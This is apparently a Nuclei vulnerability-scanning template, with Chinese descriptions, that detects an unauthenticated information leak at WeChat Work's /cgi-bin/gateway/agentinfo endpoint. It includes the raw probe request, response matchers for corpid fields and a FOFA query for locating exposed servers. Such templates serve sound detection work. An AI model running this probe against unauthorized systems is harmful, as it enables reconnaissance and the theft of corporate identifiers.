id: wechat-info-leak

info:
  name: WeChat agentinfo - 信息泄露漏洞
  author: SleepingBag945
  severity: high
  description: |
    该模板用于检测 WeChat agentinfo - 信息泄露漏洞。该类问题通常源于调试页面、配置文件、接口响应或目录资源被非预期暴露。模板会向 `/cgi-bin/gateway/agentinfo` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可获取系统版本、路径、账号、密钥、配置或业务数据等敏感信息。
    - 泄露的信息可能被用于后续漏洞匹配、凭据攻击、权限提升或横向移动。
  remediation: |
    - 关闭不必要的调试、示例、备份和信息展示接口，避免向未授权用户返回敏感内容。
    - 对敏感文件和接口增加访问控制，并从 Web 根目录移除备份、日志和配置文件。
    - 排查已泄露的凭据、令牌和配置，必要时执行轮换并检查访问日志。
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/f7869eb69bad66d177a88df4cebfe584691651ce/%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/%E8%85%BE%E8%AE%AF%20%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%20agentinfo%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md
  classification:
    cpe: cpe:2.3:a:tencent:wechat:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: tencent
    product: wechat
    fofa-query: body="wework_admin.normal_layout"
  tags: wechat,exposure,tencent,vuln

http:
  - raw:
      - |
        GET /cgi-bin/gateway/agentinfo HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && contains(body_1,"errcode") && contains(body_1,"strcorpid")
          - contains(body_1,"corpid")
        condition: and
